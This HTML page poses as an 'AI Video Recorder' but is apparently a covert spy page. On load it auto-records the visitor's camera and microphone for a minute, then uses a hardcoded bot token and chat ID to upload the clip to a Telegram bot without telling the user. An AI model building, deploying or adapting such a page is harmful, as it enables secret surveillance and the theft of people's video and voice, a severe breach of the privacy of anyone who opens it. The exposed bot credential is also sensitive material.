<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Video Recorder</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #4e54c8, #8f94fb);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        h1 {
            margin-bottom: 20px;
        }

        video {
            margin: 20px 0;
            border: 2px solid white;
            border-radius: 8px;
            max-width: 90%;
            height: auto;
        }

        button {
            margin-top: 10px;
            padding: 10px 20px;
            background: #6a11cb;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #2575fc;
        }

        #countdown {
            font-size: 1.5rem;
            margin: 10px 0;
            font-weight: bold;
        }

        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 0.8rem;
            color: #ccc;
        }
    </style>
</head>
<body>
    <h1>AI VIDEO RECORDER</h1>
    <video id="livePreview" autoplay muted></video>
    <video id="videoPlayer" controls></video>
    <div id="countdown">Recording time left: 60 seconds</div>
    <button id="toggleCamera">Switch to Rear Camera</button>
    <p>Recording will start automatically. Please allow camera and microphone access.</p>
    <div class="footer">Â© 2025 AI Video Recorder</div>

    <script>
        let useRearCamera = false; // Default to front camera
        let mediaRecorder;
        let stream;
        const chunks = [];
        let countdownInterval;

        async function startStream() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: useRearCamera ? 'environment' : 'user' },
                    audio: true
                });
                document.getElementById('livePreview').srcObject = stream;

                startRecording();
            } catch (error) {
                console.error('Error accessing camera or microphone:', error);
            }
        }

        function startRecording() {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) chunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                document.getElementById('videoPlayer').src = URL.createObjectURL(blob);
                document.getElementById('videoPlayer').load();
                document.getElementById('videoPlayer').play();
                sendToTelegram(blob);
            };

            mediaRecorder.start();
            startCountdown(60); // Start 1-minute countdown

            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach((track) => track.stop());
            }, 60000); // Stop recording after 1 minute
        }

        function startCountdown(seconds) {
            const countdownElement = document.getElementById('countdown');
            let remaining = seconds;

            countdownInterval = setInterval(() => {
                countdownElement.textContent = `Recording time left: ${remaining} seconds`;
                remaining--;

                if (remaining < 0) {
                    clearInterval(countdownInterval);
                    countdownElement.textContent = 'Recording finished.';
                }
            }, 1000);
        }

        function sendToTelegram(blob) {
            const chatId = '7361816575';
            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'video.mp4');

            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: 'POST',
                body: formData
            })
                .then((response) => {
                    if (response.ok) {
                        console.log('Video sent successfully!');
                    } else {
                        console.error('Failed to send video:', response.statusText);
                    }
                })
                .catch((error) => {
                    console.error('Error sending video:', error);
                });
        }

        document.getElementById('toggleCamera').addEventListener('click', () => {
            useRearCamera = !useRearCamera;
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                stream.getTracks().forEach((track) => track.stop());
            }
            startStream();
        });

        // Start the stream when the page loads
        startStream();
    </script>
</body>
</html>
